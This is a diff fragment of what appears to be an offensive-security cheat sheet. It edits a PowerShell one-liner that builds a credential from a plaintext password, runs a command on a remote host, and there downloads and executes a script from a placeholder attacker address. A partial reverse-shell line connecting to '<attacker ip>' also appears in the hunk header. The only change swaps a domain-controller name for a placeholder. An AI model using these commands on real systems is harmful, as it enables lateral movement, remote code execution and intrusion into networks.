@@ -60,7 +60,7 @@ $client = New-Object System.Net.Sockets.TCPClient("<attacker ip>",<attacker port
 execute command in the target host
 
 ```cmd
-powershell -c "$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', $pass);Invoke-Command -Computer dc1 -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<attacker ip>/<XXX.ps1>') } -Credential $cred"
+powershell -c "$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', $pass);Invoke-Command -Computer <name> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<attacker ip>/<XXX.ps1>') } -Credential $cred"
 ```
 
 File owner access permission 
